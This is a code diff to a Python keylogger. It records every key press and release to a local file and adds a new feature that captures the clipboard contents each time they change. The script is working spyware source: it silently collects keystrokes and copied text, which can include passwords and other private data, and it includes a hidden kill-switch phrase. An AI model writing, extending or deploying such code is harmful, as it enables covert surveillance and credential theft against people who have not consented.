@@ -1,9 +1,11 @@
 from pynput import keyboard
 from datetime import datetime
 from pathlib import Path
+import pyperclip
 
 log_file = "recording.txt"
 command = ""
+clipboard = ""
 kill_now = "wecanshutitnow"
 
 def log_it(log_entry):
@@ -24,6 +26,15 @@ def kill_switch_activated():
     log_it(log_entry)
     exit(0)
 
+def copy_clipboard():
+    # Trying to copy the clipboard
+    global clipboard
+
+    if pyperclip.paste() != clipboard:
+        clipboard = pyperclip.paste()
+        log_entry = f"Clipboard: \n\t{clipboard}\n at {datetime.now()}\n"
+        log_it(log_entry)
+
 def on_press_function(key_pressed):
     global command
 
@@ -37,10 +48,10 @@ def on_press_function(key_pressed):
         if command == kill_now:
             kill_switch_activated()
 
-        log_entry = f"Key pressed: {char} at {datetime.now()}\n"
+        log_entry = f"Key pressed:\t{char} at {datetime.now()}\n"
     else:
         name = str(key_pressed)
-        log_entry = f"Special key pressed: {name} at {datetime.now()}\n"
+        log_entry = f"Special key pressed:\t{name} at {datetime.now()}\n"
 
     log_it(log_entry)
 
@@ -48,10 +59,16 @@ def on_release_function(key_released):
     # A key is pressed
     if hasattr(key_released, 'char') and key_released.char is not None:
         char = key_released.char
-        log_entry = f"Key released: {char} at {datetime.now()}\n"
+        log_entry = f"Key released:\t{char} at {datetime.now()}\n"
     else:
         name = str(key_released)
-        log_entry = f"Special key released: {name} at {datetime.now()}\n"
+        log_entry = f"Special key released:\t{name} at {datetime.now()}\n"
+    
+    try:
+        copy_clipboard()
+    except:
+        pass
+
     log_it(log_entry)
 
 def start_keylogger():
